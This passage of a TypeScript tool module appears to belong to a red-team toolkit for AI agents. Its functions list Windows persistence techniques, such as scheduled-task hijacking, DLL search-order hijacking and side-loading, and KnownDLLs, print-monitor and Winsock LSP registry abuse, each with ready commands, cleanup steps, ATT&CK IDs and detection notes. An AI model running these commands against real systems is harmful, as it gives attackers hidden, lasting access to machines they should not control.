        cleanup_command: 'Unregister-ScheduledTask -TaskName "Updater" -Confirm:$false',
        stealth_score: 2,
        attck_ids: ["T1053.005"],
        prerequisites: ["PowerShell access, appropriate privileges"],
        detection_notes: "PowerShell script block logging captures command. Event ID 4698.",
      },
      {
        technique: "Task Scheduler Folder Hijack",
        description: "Modify an existing scheduled task's action to point to a malicious payload",
        platform,
        binary: "schtasks.exe",
        command: 'schtasks /change /tn "ExistingTaskName" /tr "C:\\Users\\Public\\payload.exe"',
        cleanup_command: 'schtasks /change /tn "ExistingTaskName" /tr "C:\\original\\path.exe"',
        stealth_score: 2,
        attck_ids: ["T1053.005"],
        prerequisites: ["Knowledge of existing task name, appropriate privileges"],
        detection_notes: "Event ID 4702 (task updated). Compare current task actions against baseline.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const existingTasks = session.state.scheduledTasks;
      const writableTasks = existingTasks.filter(t => t.writable);

      sessionContext = {
        environment_id: session.id,
        existing_tasks_count: existingTasks.length,
        writable_tasks: writableTasks.map(t => ({
          name: t.name,
          command: t.command,
          run_as: t.runAs,
        })),
        privilege_level: session.state.privilegeLevel,
        recommendations: writableTasks.length > 0
          ? `Found ${writableTasks.length} writable scheduled task(s) — "Task Scheduler Folder Hijack" is directly applicable.`
          : "No writable existing tasks found. New task creation is the primary vector.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── persist_dll ───────────────────────────────────────────────────────────────

const persist_dll: ToolDef = {
  name: "persist_dll",
  description:
    "Find DLL-based persistence techniques on Windows including DLL hijacking, side-loading, and search order abuse",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (DLL persistence is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbLibLoad = ctx.knowledgeBase.searchByFunction("library_load", platform);
    const kbDll = ctx.knowledgeBase.searchByKeyword("dll", platform);
    const kbSideload = ctx.knowledgeBase.searchByKeyword("sideload", platform);
    const kbEntries = deduplicateByBinary([...kbLibLoad, ...kbDll, ...kbSideload])
      .filter(e => e.platform === platform);

    const techniques: PersistenceTechnique[] = [
      {
        technique: "DLL Search Order Hijacking",
        description: "Place a malicious DLL in a directory that is searched before the legitimate DLL location",
        platform,
        binary: "rundll32.exe",
        command: "copy evil.dll C:\\Program Files\\VulnerableApp\\version.dll",
        cleanup_command: "del \"C:\\Program Files\\VulnerableApp\\version.dll\"",
        stealth_score: 1,
        attck_ids: ["T1574.001"],
        prerequisites: ["Write access to application directory, knowledge of missing DLL"],
        detection_notes: "Monitor for DLLs loaded from unexpected paths. Sysmon Event ID 7.",
      },
      {
        technique: "DLL Side-Loading",
        description: "Abuse a legitimate signed application that loads a specific DLL by name to execute a malicious DLL",
        platform,
        binary: "rundll32.exe",
        command: "copy legitimate_app.exe C:\\Users\\Public\\ && copy evil.dll C:\\Users\\Public\\target.dll && C:\\Users\\Public\\legitimate_app.exe",
        cleanup_command: "del C:\\Users\\Public\\legitimate_app.exe C:\\Users\\Public\\target.dll",
        stealth_score: 1,
        attck_ids: ["T1574.002"],
        prerequisites: ["Signed application binary, crafted proxy DLL"],
        detection_notes: "Monitor for signed binaries executing from unusual directories.",
      },
      {
        technique: "DLL Proxy Loading",
        description: "Create a proxy DLL that forwards exports to the legitimate DLL while executing malicious code",
        platform,
        binary: "rundll32.exe",
        command: "Replace legitimate DLL with proxy DLL that forwards all exports to original DLL renamed with .orig suffix",
        cleanup_command: "Restore original DLL from .orig backup",
        stealth_score: 1,
        attck_ids: ["T1574.002"],
        prerequisites: ["DLL export forwarding knowledge, write access to DLL path"],
        detection_notes: "Very difficult to detect. Hash comparison of DLLs against known-good baseline.",
      },
      {
        technique: "KnownDLLs Registry Abuse",
        description: "Modify HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs to redirect a known DLL",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs" /v target /t REG_SZ /d "evil.dll" /f',
        cleanup_command: 'reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs" /v target /f',
        stealth_score: 2,
        attck_ids: ["T1574.001"],
        prerequisites: ["SYSTEM-level access"],
        detection_notes: "Monitor KnownDLLs registry key. Requires reboot to take effect.",
      },
      {
        technique: "Print Monitor DLL",
        description: "Register a malicious DLL as a print monitor via registry to achieve SYSTEM-level persistence",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor" /v Driver /t REG_SZ /d "evil.dll" /f',
        cleanup_command: 'reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor" /f',
        stealth_score: 1,
        attck_ids: ["T1547.010"],
        prerequisites: ["Administrator access, DLL in %SystemRoot%\\System32"],
        detection_notes: "Monitor Print\\Monitors registry key for new entries.",
      },
      {
        technique: "WinSock LSP (Layered Service Provider)",
        description: "Install a Winsock LSP DLL that is loaded by every process making network calls",
        platform,
        binary: "netsh.exe",
        command: 'netsh winsock set catalog provider "EvilLSP" C:\\Windows\\System32\\evil.dll',
        cleanup_command: "netsh winsock reset",
        stealth_score: 1,
        attck_ids: ["T1574.002"],
        prerequisites: ["Administrator access"],
        detection_notes: "netsh winsock show catalog to list providers. Rare technique.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const writableServiceBins = session.state.writableServiceBinaries;
      const unquotedPaths = session.state.unquotedServicePaths;
      const loadedDrivers = session.state.loadedDrivers;

      sessionContext = {
        environment_id: session.id,
        writable_service_binaries: writableServiceBins,
        unquoted_service_paths: unquotedPaths,
        loaded_drivers_count: loadedDrivers.length,
        privilege_level: session.state.privilegeLevel,
        recommendations: writableServiceBins.length > 0
          ? `Found ${writableServiceBins.length} writable service binary path(s) — DLL hijacking via service binary replacement is directly applicable.`
          : unquotedPaths.length > 0
            ? `Found ${unquotedPaths.length} unquoted service path(s) — may allow DLL planting in intermediate directories.`
            : "No direct DLL hijacking opportunities from environment data. Manual DLL search order analysis recommended.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── Helpers ───────────────────────────────────────────────────────────────────

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id,
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealth_score: e.stealthScore,
    description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

// ── Export ─────────────────────────────────────────────────────────────────────

export const persistenceTools: ToolDef[] = [
  persist_cron,
  persist_service,
  persist_registry,
  persist_startup,
  persist_launchd,
  persist_scheduled_task,
  persist_dll,
];
